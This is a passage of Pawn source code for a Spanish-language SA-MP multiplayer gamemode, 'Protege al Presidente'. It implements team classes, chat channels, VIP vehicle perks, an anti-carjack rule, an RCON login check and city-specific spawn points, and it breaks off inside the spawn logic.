#include <a_samp> 	/* Créditos a SA-MP Team */
#include <a_zones> 	/* Créditos a Cueball */
#include <Pawn.CMD> /* Créditos a urShadow */
#include <sscanf> 	/* Créditos a Y_Less */

//Según Y_Less debe ser definido primero la cantidad máxima de jugadores que habrán en tu servidor, antes de incluir cualquier librería YSI.
#undef MAX_PLAYERS
#define MAX_PLAYERS (30)

#include <YSI\y_ini> 		/* Créditos a Y_Less */
#include <YSI\y_foreach>	/* Créditos a Y_Less */
#include <YSI\y_timers>		/* Créditos a Y_Less */
#include <mSelection> 		/* Créditos a Kye */

#include "library/l_pap" /* Créditos a MrDave */

main()
{
 	print("======================================================");
	print("|     Modo de juego: Protege al Presidente           |");
	print("|              Creado por MrDave |2018-2019|         |");
	print("|     www.facebook.com/groups/ProtegeAlPresidente    |");
	print("======================================================");
	return 0;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(Data[playerid][Level] == 5)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(vehicleid == 0)
			SetPlayerPos(playerid, fX, fY, fZ);
		else
		    SetVehiclePos(vehicleid, fX, fY, fZ);
	}
	return 1;
}

public OnPlayerCommandPerformed(playerid, cmd[], params[], result, flags)
{
	if(!(result != -1)) // si el comando no existe, la condición se cumple.
	{
 		GameTextForPlayer(playerid, "~r~Comando incorrecto~n~~w~Usa /comandos o /cmds", 4000, 3);
		PlayerPlaySound(playerid, 1140, 0, 0, 0);
 		return 1;
	}
	return 1;
}

public OnPlayerCommandReceived(playerid, cmd[], params[], flags)
{
	if(VIP[playerid][Autotune])
	{
	    SendClientMessage(playerid, Rojo, "ERROR: Debes cerrar el diálogo para escribir un comando.");
	    return 0;
 	}
	switch(flags)
	{
		case CMD_LEVEL_1:
		    SendErrorMessageLevel(1);
		case CMD_VIP_VEHICLE:
		{
		    SendErrorMessageLevel(2);
		    if(!IsPlayerInAnyVehicle(playerid))
				return SendClientMessage(playerid, Rojo, "ERROR: Usted debe estar en un vehículo para poder usar este comando."),0;
    		if(!(GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
				return SendClientMessage(playerid, Rojo, "ERROR: Usted debe ser el conductor para poder usar este comando."),0;
		}
		case CMD_VIP:
            SendErrorMessageLevel(2);
		case CMD_MOD:
		    SendErrorMessageLevel(3);
		case CMD_ADMIN:
		    SendErrorMessageLevel(4);
		case CMD_HIDDEN:
			return 1;
	}
	if(PC_CommandExists(cmd))
	{
 		new string[65];
 		new name[24];
 		GetPlayerName(playerid, name, sizeof(name));
  		format(string, sizeof(string), "* %s(%d) usó el comando /%s", name, playerid, cmd);
  		foreach(new i : Player)
	  	{
  			if(!((i != playerid) && (Data[i][Level] >= 3))) continue;
  			SendClientMessage(i, COLOR_GRIS, string);
		}
	}
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	if(success != 0) // si el jugador ingresa correctamente la contraseña para iniciar sesión como rcon, la condición se cumple.
	{
		new ip1[16];
		foreach(new i : Player)
		{
	    	/* Primero se necesita encontrar la id del jugador quién trató iniciar sesión como rcon. */
			GetPlayerIp(i, ip1, sizeof(ip1));
			if(!(strcmp(ip, ip1, false) == 0))continue;
			if(!((Data[i][Level] == 5) && (Data[i][Register] == INICIO_SESION)))
			{
				SetPlayerMessage(i, "RCON Hack", Rojo);
				break;
			}
			else
			{
		    	GameTextForPlayer(i, "BIENVENIDO ADMINISTRADOR ~n~RCON", 4000, 3);
	    		PlayerPlaySound(i, 1139, 0, 0, 0);
		    	Data[i][Level] = 5;
				break;
			}
		}
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
	new string[128];
	new name[24];
	new bool:valuex = false;
	GetPlayerName(playerid, name, sizeof(name));
	switch(text[0]) //switch principal
	{
	    case '&': //Cuando se habla como VIP, Moderador o Admin
	    {
	        if(Data[playerid][Level] >= 2)
	        {
	            IsPlayerSpaceText(valuex, text[1]);
	            if(valuex || text[1] == '\0')
	            {
            		SendClientMessage(playerid, Rojo, "ERROR: Debes escribir un mensaje. Ejemplo: &Hola");
            		return 0;
				}
				pc_cmd_decir(playerid, text[1]);
				return 0;
     		}
	    }
		case '!': //Cuando se habla en el Team Chat
		{
		    IsPlayerSpaceText(valuex, text[1]);
  			if(valuex || text[1] == '\0')
     		{
     			SendClientMessage(playerid, Rojo, "ERROR: Debes escribir un mensaje. Ejemplo: !Hola");
     			return 0;
			}
			pc_cmd_tpm(playerid, text[1]);
			return 0;
		}
		case '$': //Cuando se habla en el VIP Chat
		{
			if(Data[playerid][Level] >= 2)
			{
			    IsPlayerSpaceText(valuex, text[1]);
				if(valuex || text[1] == '\0')
   				{
    				SendClientMessage(playerid, Rojo, "ERROR: Debes escribir un mensaje. Ejemplo: $Hola");
    				return 0;
				}
				format(string, sizeof(string), "[Vip Chat] %s: %s", name, text[1]);
				foreach(new i : Player)
				{
					if(Data[i][Level] >= 2)
						SendClientMessage(i, 0xFF2040FF, string);
				}
				return 0;
			}
		}
		case '#': //Cuando se habla en el Admin Chat
		{
		    if(Data[playerid][Level] >= 3)
		    {
		        IsPlayerSpaceText(valuex, text[1]);
   				if(valuex || text[1] == '\0')
   				{
    				SendClientMessage(playerid, Rojo, "ERROR: Debes escribir un mensaje. Ejemplo: #Hola");
    				return 0;
				}
				format(string, sizeof(string), "[Admin Chat] %s: %s", name, text[1]);
				foreach(new i : Player)
				{
					if(Data[i][Level] >= 3)
						SendClientMessage(i, 0x00FF00FF, string);
				}
				return 0;
			}
		}
	}
	IsPlayerSpaceText(valuex, text);
	if(valuex)
	{
	    SendClientMessage(playerid, Rojo, "ERROR: Tu mensaje está vacío, debes escribir algo.");
	    return 0;
	}
 	switch(Data[playerid][Level])
  	{
   		case 0:
    	{
			format(string, sizeof(string), "%s: {818080}(%d) {FFFFFF}%s", name, playerid, text);
			SendClientMessageToAll(GetTeamColor(playerid), string);
    	}
    	case 1:
    	{
			format(string, sizeof(string), "%s: {BAB5B5}[%d] {FFFFFF}%s", name, playerid, text);
			SendClientMessageToAll(GetTeamColor(playerid), string);
    	}
    	case 2:
    	{
			format(string, sizeof(string), "%s: {00FFFF}[%d] {FFFFFF}%s", name, playerid, text);
			SendClientMessageToAll(GetTeamColor(playerid), string);
    	}
    	case 3..5:
    	{
			format(string, sizeof(string), "%s: {FFFFFF}[%d] {FFFFFF}%s", name, playerid, text);
			SendClientMessageToAll(GetTeamColor(playerid), string);
 		}
 	}
	return 0;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	//printf("DEBUG: OnPlayerEnterVehicle");
	//Anti-Carjack Team
	if((GetPlayerVirtualWorld(playerid) == 0) && (!(Data[playerid][Teams] == CIVIL || Data[playerid][Teams] == PRESIDENT)) && (ispassenger == 0))
	{
	    foreach(new i : Player)
	    {
	        if((IsPlayerInVehicle(i, vehicleid) != 0) && (GetPlayerState(i) == PLAYER_STATE_DRIVER) && ((Data[i][Teams] == Data[playerid][Teams]) || (Data[playerid][TeamPresident] == 0 && Data[i][TeamPresident] == 0)))
			{
			    if(!Carjack[playerid])
			    {
			        Carjack[playerid] = true;
			    	SetPlayerVirtualWorld(playerid, 10);
			    	TogglePlayerControllable(playerid, false);
			    	SendClientMessage(playerid, Rojo, "{66FF00}*[Anti-CJ Team]:{FF9900} Quedaste congelado por 5 segundos por tratar de robarle el vehículo a un miembro de tu equipo");
					ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX,
					"<Anti-CJ Team>", "{FFFFFF}Usted tiene una advertencia por intentar robar un vehículo.\nPor lo tanto para la próxima serás expulsado del servidor.\n¡Juegue en equipo por favor!", "Cerrar", "");
					defer FreezePlayer(playerid);
	            	return 1;
				}
				SetPlayerMessage(playerid, "Carjack Team", Rojo);
				break;
	        }
	    }
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if((newkeys == KEY_NO) && (GetPlayerDrunkLevel(playerid) > 2000))
	{
		SetPlayerDrunkLevel(playerid, 2000);
		return 1;
	}
	if((newkeys == KEY_YES) && (Data[playerid][Level] >= 1) && (GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && ((GetVehicleModel(VehiculoID[playerid]) == 520) || (GetVehicleModel(VehiculoID[playerid]) == 476)))
	{
		new Float:X;
		new Float:Y;
		new Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z+100);
		SetVehicleHealth(VehiculoID[playerid], 0);
		GivePlayerWeapon(playerid, 46, 1);
		return 1;
	}

	if((newkeys == KEY_YES) && (Data[playerid][Level] >= 2) && (GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
	{
		AddVehicleComponent(VehiculoID[playerid], 1010);
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	}
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(!VIP[playerid][cc] && VIP[playerid][ColorPrimary] != -1)
		{
	    	ChangeVehicleColorEx(GetPlayerVehicleID(playerid), VIP[playerid][ColorPrimary], VIP[playerid][ColorSecundary]);
		}
		
		if(VIP[playerid][Wheels])
		     AddVehicleComponent(GetPlayerVehicleID(playerid), VIP[playerid][SaveWheels_ID]);
		     
		if(VIP[playerid][Nitro])
			AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
			
		if(VIP[playerid][Hydraulics])
			AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);

		if(VIP[playerid][cc])
            VIP[playerid][Stop_cc] = repeat Colors_Vehicle(playerid);
	}
	if((newstate == PLAYER_STATE_WASTED || newstate == PLAYER_STATE_ONFOOT) && (oldstate == PLAYER_STATE_DRIVER && VIP[playerid][cc]))
	{
		stop VIP[playerid][Stop_cc];
		SetVehicleColorEx(playerid, VehiculoID[playerid]);
		//printf("DEBUG: cc");
	}
	if((newstate == PLAYER_STATE_DRIVER) && (GetPlayerDrunkLevel(playerid) > 2000))
		SendClientMessage(playerid, Amarillo, "ADVERTENCIA: Usted se encuentra borracho para manejar, te recomiendo presionar la tecla 'N' para quitar la borrachera.");

	if((newstate == PLAYER_STATE_PASSENGER) && (GetPlayerWeapon(playerid) == 24))
		SetPlayerArmedWeapon(playerid, 0);
		
	if(oldstate == PLAYER_STATE_DRIVER)
	{
		foreach(new i : Player)
		{
			if((GetPlayerState(i) == PLAYER_STATE_PASSENGER) && (VehiculoID[playerid] == VehiculoID[i]))
				RemovePlayerFromVehicle(i);
		}
	}
	
	if((newstate == PLAYER_STATE_DRIVER) && (Data[playerid][Teams] == PRESIDENT))
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		new AvionHeli[20] = {417,425,447,460,469,476,487,488,497,511,512,513,519,520,548,553,563,577,592,593};
		for(new i = 0; i < sizeof(AvionHeli); ++i)
		{
			if(!(GetVehicleModel(vehicleid) == AvionHeli[i])) continue;
			SendClientMessage(playerid, -1, "* El Presidente no puede conducir aviones o helicópteros.");
			RemovePlayerFromVehicle(playerid);
			break;
		}
	}

	if((newstate == PLAYER_STATE_DRIVER) && (Data[playerid][Teams] == CIVIL) && (GetVehicleModel(VehiculoID[playerid]) == 520))
	{
		SendClientMessage(playerid, -1, "* Los civiles no pueden manejar un hydra.");
		RemovePlayerFromVehicle(playerid);
		return 1;
	}

	if(newstate == PLAYER_STATE_PASSENGER)
	{
		new bool:Driver = false;
		foreach(new i : Player)
		{
			if(!((GetPlayerState(i) == PLAYER_STATE_DRIVER) && (VehiculoID[playerid] == VehiculoID[i])))continue;
			Driver = true;
			break;
		}
		if(Driver == false)
		{
			RemovePlayerFromVehicle(playerid);
			return 1;
		}
	}
	if((newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER) && (Data[playerid][Teams] == VICEPRESIDENT) && (id_president != INVALID_PLAYER_ID))
	{
		if((IsPlayerInAnyVehicle(id_president) == 1) && (VehiculoID[playerid] == VehiculoID[id_president]))
		{
			ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "{FF0000}<ERROR>", "{FFFFFF}El {FFFF00}VicePresidente {FFFFFF}no puede viajar junto con el {FFFF00}Presidente.", "Cerrar", "");
			RemovePlayerFromVehicle(playerid);
			return 1;
		}
	}

	if((newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER) && (Data[playerid][Teams] == PRESIDENT) && (id_vicepresident != INVALID_PLAYER_ID))
	{
		if((IsPlayerInAnyVehicle(id_vicepresident) == 1) && (VehiculoID[playerid] == VehiculoID[id_vicepresident]))
		{
			ShowPlayerDialog(playerid, 5, DIALOG_STYLE_MSGBOX, "{FF0000}<ERROR>", "{FFFFFF}El {FFFF00}Presidente {FFFFFF}no puede viajar junto con el {FFFF00}VicePresidente.", "Cerrar", "");
			RemovePlayerFromVehicle(playerid);
		}
	}
	return 1;
}

public OnPlayerConnect(playerid)
{
	//print("DEBUG: Se ejecutó OnPlayerConnect\n");
    SetPlayerColor(playerid, 0xFFFFFFAA);
	SendDeathMessage(INVALID_PLAYER_ID, playerid, 200);
	//===========================================================
	//Definición de variables VIP
	VIP[playerid][Autotune] = false;
	VIP[playerid][Wheels] = false;
	VIP[playerid][Hydraulics] = false;
	VIP[playerid][Vset] = false;
	VIP[playerid][Nitro] = false;
	VIP[playerid][SaveWheels_ID] = false;
	VIP[playerid][cc] = false;
	VIP[playerid][ColorPrimary] = -1;
	VIP[playerid][ColorSecundary] = -1;
	VIP[playerid][DialogPrimary] = -1;
	//===========================================================
	Data[playerid][KillingSpree] = 0;//para contar las rachas.
	Data[playerid][TimeSelectTeam] = 0;
	Data[playerid][Sync] = 0;
	Data[playerid][TimeHoli] = 0;
	Data[playerid][TiempoApoyo] = 0;
	Data[playerid][TPMColor] = Amarillo;
	TimePositionSuccess[playerid] = 0;
	Data[playerid][Godmode] = false;
	Data[playerid][IsClassSelection] = false;
	Carjack[playerid] = false;
	Data[playerid][IsKillingSpree] = false;//para detectar si un jugador realmente tiene la maxima racha.
	Data[playerid][ASK] = false;
	MostrarRachas[playerid] = true;
	Data[playerid][PM] = true;//si guarda el "true" significa que los mensajes privados están activados.
	Data[playerid][Warning] = 0;
	Data[playerid][Teams] = -1;
	UltimoID_PM[playerid] = INVALID_PLAYER_ID;
	Data[playerid][TeamPresident] = -1;/* Si guardamos un -1 a en la matriz, significa que no pertenece al equipo del presidente. */
	Data[playerid][ForcePlayer] = JUGADOR_NO_FORZADO; /* Si guarda el 0, quiere decir que no hemos forzado al jugador para volver a la selección de clases */
	VehiculoID[playerid] = 0;
	new NamePath3[45];
	Route(playerid, NamePath3);
	Data[playerid][TimeRegister] = ((fexist(NamePath3) == 1) ? (0) : (gettime() + (60 * 10)));
	
	/* Íconos de San Fierro*/
	SetPlayerMapIcon(playerid, 0, -2625.7224,210.4586,4.6209, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 1, -2357.4741,1007.8342,50.8984, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 2, -1456.4299,1500.8383,6.9688, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 3, -2111.2688,-444.0200,38.7344, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 4, -1757.7292,962.9088,24.8828, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 5, -1750.7778,962.6926,24.8828, 22, MAPICON_LOCAL);
	/* Íconos de Las Venturas */
	SetPlayerMapIcon(playerid, 6, 2637.2034,1128.5149,11.1797, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 7, 2156.9280,943.1653,10.8203, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 8, 2000.4783,1550.1896,13.5995, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 9, 2000.5225,1538.3048,13.5859, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 10, 2536.1555,2083.9502,10.8203, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 11, 2832.6008,2399.5635,11.0625, 22, MAPICON_LOCAL);
	/* Íconos de Los Santos */
	SetPlayerMapIcon(playerid, 12, 1177.6949,-1323.0242,14.0834, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 13, 1721.5927,-1881.5479,13.5649, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 14, 1704.6733,-1881.6581,13.5691, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 15, 478.9765,-1499.2694,20.4801, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 16, 2038.3618,-1411.2306,17.1641, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 17, 2520.0537,-1483.1400,23.9996, 22, MAPICON_LOCAL);
	SetPlayerMapIcon(playerid, 18, 2401.6936,-1980.3127,13.5469, 22, MAPICON_LOCAL);
	return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
	//printf("DEBUG: OnPlayerDisconnect");
	RemoveASK(playerid);
	SendDeathMessage(INVALID_PLAYER_ID, playerid, 201);
	if(SpecID[playerid] != INVALID_PLAYER_ID)
	    SpecID[playerid] = INVALID_PLAYER_ID;
	if(Data[playerid][IsKillingSpree]) /* La variable va a toma el valor de "true" si el jugador es la persona de la mayor racha. */
	{
		MayorRacha = 1;
		TextDrawDestroy(TextSpree[0]);
	    foreach(new i : Player)
	    {
	        if(MostrarRachas[i])
	        {
				TextDrawHideForPlayer(i, TextSpree[1]);
				TextDrawHideForPlayer(i, TextSpree[2]);
			}
			else continue;
		}
	}
	if((IsPlayerInClassSelection(playerid) != 1) && (Data[playerid][Teams] == VICEPRESIDENT))
	    id_vicepresident = INVALID_PLAYER_ID;
	    
	if(VIP[playerid][cc])
	{
		stop VIP[playerid][Stop_cc];
		SetVehicleColorEx(playerid, VehiculoID[playerid]);
	}

	if((IsPlayerInClassSelection(playerid) == 0) && (Data[playerid][Teams] == PRESIDENT))
	{
		Data[playerid][Teams] = PRESIDENTE_DESAPARECIDO;
		SetPlayerMap(((id_vicepresident != INVALID_PLAYER_ID) ? (SI_HAY_PRESIDENTE) : (NO_HAY_PRESIDENTE)));
	}
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
    SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);//Borra el límite que hayas puesto antes
	if((Data[playerid][Teams] != PRESIDENT) && (Data[playerid][ForcePlayer] == JUGADOR_MUERTO_FORZADO))
	//Esto es para cuando el jugador se lo fuerza a ir a la selección de clases y luego muere, entonces la condición se cumplirá.
	{
		Data[playerid][ForcePlayer] = JUGADOR_NO_FORZADO;
		if(Espiar[playerid] == RETADOR || Espiar[playerid] == OPONENTE)
			Data[playerid][ForcePlayer] = JUGADOR_SI_FORZADO;
		SetSpawnInfo(playerid, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
		SpawnPlayer(playerid);
		return 1;
	}
    if((IsPlayerInClassSelection(playerid) == 0) && (Data[playerid][Teams] == VICEPRESIDENT))
    {
    //si el jugador anteriormente no estaba en la selección de clase y es el vicepresidente, la condición se cumple.
	    GameTextForPlayer(playerid, "~w~EL VICEPRESIDENTE NO PUEDE~n~   ~r~CAMBIARSE DE CLASE", 5000, 3);
	    SetSpawnInfo(playerid, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
		SpawnPlayer(playerid);
		return 1;
	}
	if((TimeLeft[playerid][TEXT_DRAW] == true) && (id_president == INVALID_PLAYER_ID))
	    TextDrawHideForPlayer(playerid, TextTL);
	if((MayorRacha > 1) && (MostrarRachas[playerid] == true))
	{
		TextDrawShowForPlayer(playerid, TextSpree[0]);
		TextDrawShowForPlayer(playerid, TextSpree[1]);
		TextDrawShowForPlayer(playerid, TextSpree[2]);
	}
	RemoveASK(playerid);
	SetPlayerColor(playerid, 0xFFFFFFAA);
	Data[playerid][IsClassSelection] = true;
	TextDrawHideForPlayer(playerid, TextPAP[0]);
	TextDrawHideForPlayer(playerid, TextPAP[1]);
	Data[playerid][SkinClass] = GetPlayerSkin(playerid);
	switch(City)
	{
		case VENTURAS:
		{
			SetPlayerPos(playerid, 2125.4805,1584.6116,20.3906);
			SetPlayerCameraPos(playerid, 2129.7498,1587.7242,20.3906);
			SetPlayerCameraLookAt(playerid, 2124.3401,1583.7800,20.3906);
			SetPlayerFacingAngle(playerid, 306.0959);
			SetPlayerInterior(playerid, 0);
		}
		case SANTOS:
		{
			SetPlayerPos(playerid, 4480.9756,-2510.5552,3.6747);
			SetPlayerCameraPos(playerid, 4475.0513,-2508.5028,4.1533);
			SetPlayerCameraLookAt(playerid, 4480.9756,-2510.5552,3.6747);
			SetPlayerFacingAngle(playerid, 91.9195);
			SetPlayerInterior(playerid, 0);
		}
		case FIERRO:
		{
			SetPlayerPos(playerid, -2112.2437,176.7923,35.3929);
			SetPlayerCameraPos(playerid, -2112.2803,181.6424,36.3327);
			SetPlayerCameraLookAt(playerid, -2112.2437,176.7923,35.3929);
			SetPlayerFacingAngle(playerid, 1.0000);
			SetPlayerInterior(playerid, 0);
		}
	}
	new balance = 0;
	switch(classid)
	{
		case 0://id clase presidente
		{
			GameTextForPlayer(playerid, ((id_president == INVALID_PLAYER_ID) ? ("~y~presidente~n~~r~disponible") : ("~y~presidente~n~~r~no disponible")), 9999999999, 6);
			ClaseDisponible[playerid] = ((id_president == INVALID_PLAYER_ID) ? (true) : (false));
			Data[playerid][Teams] = PRESIDENT;
		}
		case 1://id clase vicepresidente
		{
			GameTextForPlayer(playerid, ((id_vicepresident == INVALID_PLAYER_ID) ? ("~y~vicepresidente~n~~r~disponible") : ("~y~vicepresidente~n~~r~no disponible")), 9999999999, 6);
            ClaseDisponible[playerid] = ((id_vicepresident == INVALID_PLAYER_ID) ? (true) : (false));
			Data[playerid][Teams] = VICEPRESIDENT;
		}
		case 2..5://id clase seguridad
		{
		    balance = TeamBalance(SECURITY);
			GameTextForPlayer(playerid, (((!(balance != 1))) ? ("~y~seguridad~n~~r~disponible") : ("~y~seguridad~n~~r~no disponible")), 9999999999, 6);
			ClaseDisponible[playerid] = ((balance != 0) ? (true) : (false));
			Data[playerid][Teams] = SECURITY;
		}
		case 6..9://id clase policía
		{
		    balance = TeamBalance(POLI);
			GameTextForPlayer(playerid, (((!(balance != 1))) ? ("~y~policia~n~~r~disponible") : ("~y~policia~n~~r~no disponible")), 9999999999, 6);
            ClaseDisponible[playerid] = ((balance != 0) ? (true) : (false));
			Data[playerid][Teams] = POLI;
		}
		case 10..11://id clase swat
		{
		    balance = TeamBalance(SWAT);
			GameTextForPlayer(playerid, (((!(balance != 1))) ? ("~y~swat~n~~r~disponible") : ("~y~swat~n~~r~no disponible")), 9999999999, 6);
            ClaseDisponible[playerid] = ((balance != 0) ? (true) : (false));
			Data[playerid][Teams] = SWAT;
		}
		case 12..19://id clase terrorista
		{
		    balance = TeamBalance(TERRO);
			GameTextForPlayer(playerid, (((!(balance != 1))) ? ("~y~terrorista~n~~r~disponible") : ("~y~terrorista~n~~r~no disponible")), 9999999999, 6);
            ClaseDisponible[playerid] = ((balance != 0) ? (true) : (false));
			Data[playerid][Teams] = TERRO;
		}
		case 20..30://id clase civiles
		{
		    balance = TeamBalance(CIVIL);
			GameTextForPlayer(playerid, (((!(balance != 1))) ? ("~y~civil~n~~r~disponible") : ("~y~civil~n~~r~no disponible")), 9999999999, 6);
            ClaseDisponible[playerid] = ((balance != 0) ? (true) : (false));
			Data[playerid][Teams] = CIVIL;
		}
	}
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	if(IsMapLoading == true)
	{
	    SendClientMessage(playerid, Rojo, "ERROR: Debes esperar 10 segundos para que se cargue el nuevo mapa.");
		return 0;
	}
	new teamid = Data[playerid][Teams];
	if((teamid == PRESIDENT) && (Data[playerid][President] > gettime()))
	{
	    SetPlayerTimeCMD(playerid, "para volver a escoger la clase de Presidente", Data[playerid][President], 15);
		return 0;
	}
	if((teamid == VICEPRESIDENT) && (Data[playerid][VicePresident] > gettime()))
	{
	    SetPlayerTimeCMD(playerid, "para volver a escoger la clase de VicePresidente", Data[playerid][VicePresident], 15);
		return 0;
	}
	if(teamid == PRESIDENT)
	{
		if(id_president != INVALID_PLAYER_ID) //Si hay presidente
		{
  			if(ClaseDisponible[playerid])
				SendClientMessage(playerid, Rojo, "ERROR: Ya hay un Presidente.");
    		return 0;
		}
		if(id_president == INVALID_PLAYER_ID) //Si no hay un presidente
  			id_president = playerid;
	}
	if(teamid == VICEPRESIDENT)
	{
		if(id_vicepresident != INVALID_PLAYER_ID) //Si hay un vicepresidente
		{
			if(ClaseDisponible[playerid])
  				SendClientMessage(playerid, Rojo, "ERROR: Ya hay un VicePresidente.");
  			return 0;
		}
	}
	if((teamid != PRESIDENT || teamid != VICEPRESIDENT) && (!TeamBalance(teamid)))
	{
		if(ClaseDisponible[playerid])
		{
		    new str[50];
		    format(str, sizeof(str), "ERROR: La clase de %s no está disponible.", GetTeamName(playerid));
 			SendClientMessage(playerid, Rojo, str);
		}
 		return 0;
	}
	if((id_vicepresident == INVALID_PLAYER_ID) && (teamid == VICEPRESIDENT))
	{
		new string[58];
		new name[24];
		GetPlayerName(playerid, name, sizeof(name));
		format(string, sizeof(string), "* %s es el nuevo VicePresidente.", name);
		SendClientMessageToAll(Amarillo, string);
		id_vicepresident = playerid;
	}
	Data[playerid][IsClassSelection] = false;
	GameTextForPlayer(playerid, "_", 5000, 4);
	return 1;
}

public OnPlayerSpawn(playerid)
{
	//printf("DEBUG: OnPlayerSpawn (PAPV3.pwn)");
	Hide_TopTimes playerid;
	Data[playerid][IsClassSelection] = false;
	Espiar[playerid] = NINGUNO;
	SpecID[playerid] = INVALID_PLAYER_ID;
	RemoveASK(playerid);
	switch(City)
	{
		case VENTURAS:
		{
		    switch(Data[playerid][Teams])
		    {
		        case PRESIDENT:
				{
					SetPlayerPos(playerid, 1035.2422,1035.1316,11.0000);
					SetPlayerFacingAngle(playerid, 309.4052);
				}
				case VICEPRESIDENT:
				{
					SetPlayerPos(playerid, 1056.7166,1049.3638,10.2755);
					SetPlayerFacingAngle(playerid, 307.2119);
				}
				case SECURITY:
				{
					SetPlayerPos(playerid, 1081.2190+random(20),1069.3624+random(20),10.8359);
					SetPlayerFacingAngle(playerid, 310.9719);
				}
				case POLI:
				{
					SetPlayerPos(playerid, 2308.5901+random(10),2450.3101,10.8203);
					SetPlayerFacingAngle(playerid, 180.1580);
				}
				case SWAT:
				{
					SetPlayerPos(playerid, 2341.9460,2383.6560+random(20),10.8203);
					SetPlayerFacingAngle(playerid, 359.6299);
				}
				case TERRO:
				{
					SetPlayerPos(playerid, 1282.9500+random(100),2673.7300,11.2392);
					SetPlayerFacingAngle(playerid, 358.5450); 
				}
				case CIVIL:
				{
					SetPlayerPos(playerid, 2533.8831+random(20),1568.4209+random(20),10.9624);
					SetPlayerFacingAngle(playerid, 95.2153);
				}
		    }
			SetPlayerWorldBounds(playerid, 2966.18, 642.2831, 2954.502, 548.8602);//Límite para Las Venturas
			if(!(IsMapLoading != false))
			{
				for(new i = 0; i <= 4; ++i)
					GangZoneShowForPlayer(playerid, i, ((i == 0) ? (0xFFFF0077) : ((i == 1) ? (0x006BD777) : ((i == 2) ? (0x006BD777) : ((i == 3) ? (0xAA333377) : ((i == 4) ? (0xFFA00077) : (-1)))))));
			}
		}
		case SANTOS:
		{
  			switch(Data[playerid][Teams])
		    {
		        case PRESIDENT:
				{
					SetPlayerPos(playerid, 1125.9922,-2037.4167,69.8834);
					SetPlayerFacingAngle(playerid, 271.6391);
				}
				case VICEPRESIDENT:
				{
					SetPlayerPos(playerid, 1158.4073,-2038.0676,69.0078);
					SetPlayerFacingAngle(playerid, 275.0857);
				}
				case SECURITY:
				{
					SetPlayerPos(playerid, 1199.8093+random(20),-2037.8384+random(20),69.0078);
					SetPlayerFacingAngle(playerid, 270.6990);
				}
				case POLI:
				{
					SetPlayerPos(playerid, 1563.4358+random(20),-1630.6005,13.3828);
					SetPlayerFacingAngle(playerid, 92.7242);
				}
				case SWAT:
				{
					SetPlayerPos(playerid, 1563.8300-random(20),-1695.7500,5.8906);
					SetPlayerFacingAngle(playerid, 182.6600);
				}
				case TERRO:
				{
					SetPlayerPos(playerid, 1632.2454+random(50),-1073.9819,23.8984);
					SetPlayerFacingAngle(playerid, 197.9492);
				}
				case CIVIL:
				{
					SetPlayerPos(playerid, 2154.5183,-1195.6249+random(50),23.8486);
					SetPlayerFacingAngle(playerid, 183.2550);
				}
		    }
			SetPlayerWorldBounds(playerid, 2977.858, 93.423, -688.9946, -2907.791);//Límite para Los Santos
			if(!(IsMapLoading != false))
			{
				for(new i = 5; i <= 8; ++i)
					GangZoneShowForPlayer(playerid, i, ((i == 5) ? (0xFFFF0077) : ((i == 6) ? (0x006BD777) : ((i == 7) ? (0xAA333377) : ((i == 8) ? (0xFFA00077) : (-1))))));
			}
		}
		case FIERRO:
		{
  			switch(Data[playerid][Teams])
		    {
		        case PRESIDENT:
				{
					SetPlayerPos(playerid, -2642.6023,-28.6191,6.1328);
					SetPlayerFacingAngle(playerid, 178.5942);
				}
				case VICEPRESIDENT:
				{
					SetPlayerPos(playerid, -2653.4700,-28.8835,6.1328);
					SetPlayerFacingAngle(playerid, 191.4410);
				}
				case SECURITY:
				{
					SetPlayerPos(playerid, -2650.9294+random(20),-40.7740,4.3359);
					SetPlayerFacingAngle(playerid, 179.8475);
				}
				case POLI:
				{
					SetPlayerPos(playerid, -1623.2400+random(30),661.2060,7.1875);
					SetPlayerFacingAngle(playerid, 267.1450);
				}
				case SWAT:
				{
					SetPlayerPos(playerid, -1609.2900-random(20),687.6350,-5.2422);
					SetPlayerFacingAngle(playerid, 267.8280);
				}
				case TERRO:
				{
